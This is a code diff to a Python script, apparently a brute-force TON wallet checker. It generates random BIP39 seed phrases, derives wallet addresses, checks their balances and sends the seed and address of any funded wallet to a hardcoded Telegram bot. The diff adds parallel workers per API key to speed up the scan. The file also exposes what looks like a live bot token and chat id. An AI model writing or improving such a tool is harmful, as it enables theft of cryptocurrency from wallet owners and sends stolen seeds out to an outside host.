@@ -25,6 +25,7 @@ TELEGRAM_TOKEN = "8173054236:AAFVqnTIlzX6eYMIF03UJeAKaqmdTlDmKAk"
 TELEGRAM_CHAT_ID = "1046292733"
 REQUEST_TIMEOUT = 30
 RATE_LIMIT = 1.0  # seconds between requests per API key
+CONCURRENT_TASKS_PER_KEY = 3  # Количество параллельных задач на каждый API ключ
 
 # Load BIP39 words
 try:
@@ -53,9 +54,10 @@ class Color:
 
 class WalletChecker:
     def __init__(self):
-        self.semaphores = {key: asyncio.Semaphore(1) for key in API_KEYS}
+        self.semaphores = {key: asyncio.Semaphore(CONCURRENT_TASKS_PER_KEY) for key in API_KEYS}
         self.session = None
         self.rate_limit = {key: 0 for key in API_KEYS}
+        self.task_count = 0
 
     async def init_session(self):
         timeout = ClientTimeout(total=REQUEST_TIMEOUT)
@@ -120,7 +122,7 @@ class WalletChecker:
         except Exception as e:
             return None, str(e)
 
-    async def process_wallet(self, api_key: str):
+    async def process_wallet(self, api_key: str, worker_id: int):
         client = TonapiClient(api_key=api_key, is_testnet=IS_TESTNET)
         
         while True:
@@ -132,35 +134,42 @@ class WalletChecker:
                     wallet, _, _, _ = WalletV5R1.from_mnemonic(client, seed.split())
                     address = wallet.address.to_str()
                     
-                    logging.info(f"{Color.BLUE}Checking:{Color.END} {address[:8]}...{address[-6:]}")
+                    logging.info(f"{Color.BLUE}Worker {worker_id} checking:{Color.END} {address[:8]}...{address[-6:]}")
                     
                     result, error = await self.fetch_wallet_data(address)
                     
                     if error:
-                        logging.error(f"{Color.RED}Error:{Color.END} {error}")
+                        logging.error(f"{Color.RED}Worker {worker_id} error:{Color.END} {error}")
                         continue
                     
                     if "TON" in str(result) or "NFT" in str(result):
                         message = (
-                            f"🔹 <b>New Wallet Found!</b>\n"
+                            f"🔹 <b>New Wallet Found by worker {worker_id}!</b>\n"
                             f"🌱 <b>Seed:</b> <code>{seed}</code>\n"
                             f"📬 <b>Address:</b> <code>{address}</code>\n"
                             f"📊 <b>Details:</b>\n" + "\n".join(result)
                         )
                         
-                        logging.info(f"{Color.GREEN}Found wallet:{Color.END}\n{message}")
+                        logging.info(f"{Color.GREEN}Worker {worker_id} found wallet:{Color.END}\n{message}")
                         await self.send_to_telegram(message)
                     else:
-                        logging.debug(f"Empty wallet: {address}")
+                        logging.debug(f"Worker {worker_id}: Empty wallet: {address}")
                         
             except Exception as e:
-                logging.error(f"{Color.RED}Critical error:{Color.END} {str(e)}")
+                logging.error(f"{Color.RED}Worker {worker_id} critical error:{Color.END} {str(e)}")
                 await asyncio.sleep(5)
 
     async def run(self):
         await self.init_session()
         try:
-            tasks = [self.process_wallet(key) for key in API_KEYS]
+            tasks = []
+            for key_idx, key in enumerate(API_KEYS):
+                for worker_id in range(CONCURRENT_TASKS_PER_KEY):
+                    global_worker_id = key_idx * CONCURRENT_TASKS_PER_KEY + worker_id
+                    task = asyncio.create_task(self.process_wallet(key, global_worker_id))
+                    tasks.append(task)
+                    await asyncio.sleep(0.1)  # Небольшая задержка между запуском задач
+            
             await asyncio.gather(*tasks)
         finally:
             await self.close_session()
